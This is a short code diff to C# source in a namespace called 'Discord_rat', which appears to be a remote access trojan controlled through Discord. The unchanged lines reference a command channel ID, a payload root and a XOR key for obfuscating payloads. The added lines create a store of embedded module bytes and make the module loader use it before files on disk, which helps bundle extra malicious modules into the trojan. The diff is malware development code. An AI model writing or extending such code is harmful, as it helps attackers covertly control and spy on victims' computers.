@@ -151,6 +151,7 @@ namespace Discord_rat
         public static string ChannelId = "unset";
         public static string HelpMenuMessageId = null;
         public static string PayloadRoot = null;
+        public static Dictionary<string, byte[]> EmbeddedModules = new Dictionary<string, byte[]>();
         private const byte PayloadXorKey = 0xA7;
 
         public static string GetPayloadPath()
@@ -1525,6 +1526,11 @@ namespace Discord_rat
         }
         public static async Task<byte[]> GetModuleBytes(string moduleKey, string fileName)
         {
+            if (EmbeddedModules != null && EmbeddedModules.ContainsKey(moduleKey))
+            {
+                return EmbeddedModules[moduleKey];
+            }
+
             string baseDir = GetPayloadDirectory();
             var candidateNames = new List<string>();
 
